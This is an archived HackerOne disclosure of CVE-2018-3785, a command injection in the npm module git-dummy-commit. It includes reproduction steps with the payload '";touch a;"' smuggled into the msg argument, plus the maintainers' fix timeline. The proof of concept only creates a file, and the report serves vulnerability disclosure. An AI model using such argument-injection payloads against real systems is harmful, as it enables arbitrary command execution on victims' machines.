---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
  - stack/node
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2018-06-15
submitted: 2018-04-22T03:26:03.610Z
bounty_usd: null
votes: 5
cve: "CVE-2018-3785"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "caioluders"
source: "https://hackerone.com/reports/341710"
title: "[git-dummy-commit] Command injection on the msg parameter"
---
# [git-dummy-commit] Command injection on the msg parameter

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Node.js third-party modules | **Disclosed:** 2018-06-15

- Report: [https://hackerone.com/reports/341710](https://hackerone.com/reports/341710)
- CWE: OS Command Injection | CVE: CVE-2018-3785
- Submitted: 2018-04-22T03:26:03.610Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi there, I've found a Command Injection on the "git-dummy-commit" module.

# Module

**module name:** git-dummy-commit
**version:** 1.3.0
**npm page:** https://www.npmjs.com/package/git-dummy-commit

## Module Description

> Create a dummy commit for testing

## Module Stats

[62] downloads in the last day
[94] downloads in the last week
[384] downloads in the last month
[6078]  downloads in the last year

# Vulnerability

## Vulnerability Description

The module appends the `msg` parameter to a command on the [line 37](https://github.com/stevemao/git-dummy-commit/blob/master/index.js#L37)  without escaping it, leading to a command injection.

## Steps To Reproduce:

* Install the module 

```
$ npm install git-dummy-commit
```

* Example code with the malicious payload `";touch a;"` on line 3.

```javascript
const gitDummyCommit = require('git-dummy-commit');

gitDummyCommit('";touch a;"');
```
* Run it.

```
$ node index.js
```

* Check the newly create file `a` 

```
$ ls
a		index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `git` command.

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker that controls the `msg` parameter can injection command on the victim's machine.

## Timeline

- **Report Filed**
- **2018-04-23** @lirantal: Hi @caioluders i,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **Report Triaged**
- **2018-05-11** @lirantal: Since the author didn't join the report I opened a security issue in the repo.
- **External User Joined**
- **2018-05-13** @stevemao: Sorry for the late reply. I just opened a PR:
https://github.com/stevemao/git-dummy-commit/pull/2
- **Report Severity Updated**
- **2018-05-31** @lirantal: @stevemao I commented on that PR and I think you still need to resolve it.
@caioluders could you also review and add any comments?
- **2018-06-01** @caioluders: Just made a comment there. Just isolate the parameters
- **Changed Scope**
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
